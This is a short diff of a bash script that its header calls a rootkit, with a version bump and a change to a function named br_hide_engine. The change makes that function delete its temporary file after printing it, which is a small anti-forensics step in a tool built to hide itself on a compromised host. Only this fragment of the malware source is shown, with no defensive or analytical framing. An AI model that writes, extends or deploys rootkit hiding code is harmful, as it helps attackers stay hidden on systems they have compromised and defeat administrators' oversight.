@@ -1,5 +1,5 @@
 #!/bin/bash
-# Lightweight rootkit implemented by bash shell scripts v0.01
+# Lightweight rootkit implemented by bash shell scripts v0.06
 #
 # by wzt 2015 	http://www.cloud-sec.org
 #
@@ -52,7 +52,7 @@ function br_hide_engine()
                 #echo $func_line
                 sed -i "$func_line,+$func_num d" .br.tmp >/dev/null 2>&1
         done
-	cat .br.tmp
+	cat .br.tmp; rm -f .br.tmp
 }
 
 function builtin()
